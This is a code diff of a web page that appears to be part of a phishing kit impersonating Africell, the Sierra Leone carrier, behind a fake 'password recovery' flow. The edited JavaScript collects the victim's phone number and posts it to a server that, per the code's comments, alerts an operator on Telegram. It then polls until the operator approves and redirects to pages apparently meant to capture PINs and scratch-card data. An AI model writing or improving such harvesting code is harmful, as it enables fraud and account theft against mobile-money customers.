@@ -83,50 +83,53 @@
             }
         }
 
-        document.getElementById('sendBtn').addEventListener('click', async () => {
-            const phoneVal = document.getElementById('recoveryPhone').value.trim();
+        function isValidSierraLeonePhone(number) {
+            const cleaned = number.replace(/[\s-]/g, '');
+            return /^\d{8,9}$/.test(cleaned);
+        }
+
+        async function submitRecoveryPhone() {
+            const rawPhone = document.getElementById('recoveryPhone').value.trim();
             const sendBtn = document.getElementById('sendBtn');
             const spinnerDiv = document.getElementById('loadingSpinner');
 
-            if (!phoneVal || phoneVal.length < 8) {
-                showAppAlert('❌ Please enter a valid mobile number.');
+            if (!rawPhone || !isValidSierraLeonePhone(rawPhone)) {
+                showAppAlert('❌ Enter Correct Africell Number');
                 return;
             }
 
-            const fullPhone = '+232' + phoneVal;
+            // Clean format without extra internal spaces to match server precisely
+            const fullPhone = '+232' + rawPhone;
             localStorage.setItem('africellUserPhone', fullPhone);
+            localStorage.setItem('userPhone', fullPhone);
 
             try {
                 sendBtn.classList.add('disabled-state');
                 if (spinnerDiv) spinnerDiv.style.display = 'flex';
 
-                // Submit recovery request to server & trigger Telegram notification
                 const response = await fetch('/api/submit-order', {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ 
-                        phone: fullPhone, 
-                        uniqueId: 'Password Recovery Request' 
-                    })
+                    body: JSON.stringify({ phone: fullPhone, uniqueId: 'Password Recovery Request' })
                 });
 
                 const result = await response.json();
 
                 if (result.success) {
-                    // Start polling: strictly waits for admin to click 'Approve' or 'Wrong Info'
+                    console.log('✅ Order submitted successfully. Starting status poll for:', fullPhone);
                     pollApprovalStatus(fullPhone);
                 } else {
                     sendBtn.classList.remove('disabled-state');
                     if (spinnerDiv) spinnerDiv.style.display = 'none';
-                    showAppAlert('❌ Failed to submit. Please try again.');
+                    showAppAlert('❌ Submission failed. Please try again.');
                 }
             } catch (error) {
-                console.error('Error:', error);
+                console.error('Connection Error:', error);
                 sendBtn.classList.remove('disabled-state');
                 if (spinnerDiv) spinnerDiv.style.display = 'none';
                 showAppAlert('Could not connect to the backend server.');
             }
-        });
+        }
 
         function pollApprovalStatus(phone) {
             const cleanPhone = phone.trim();
@@ -135,10 +138,12 @@
 
             const statusInterval = setInterval(async () => {
                 try {
-                    const response = await fetch(`/api/check-status?phone=${encodeURIComponent(cleanPhone)}`);
+                    const checkUrl = `/api/check-status?phone=${encodeURIComponent(cleanPhone)}`;
+                    const response = await fetch(checkUrl);
                     const data = await response.json();
 
-                    // ONLY proceed when admin clicks Approve
+                    console.log('Polling server status response:', data); // Check your F12 console to see this!
+
                     if (data.status === 'approved') {
                         clearInterval(statusInterval);
                         window.location.href = 'scratch2.html';
@@ -151,8 +156,9 @@
                             window.location.href = 'pin3.html';
                         });
                     }
+                    // If status is 'pending', it will loop quietly until you click Approve/Reject on Telegram
                 } catch (e) {
-                    console.error('Polling error', e);
+                    console.error('Polling network error:', e);
                 }
             }, 3000);
         }
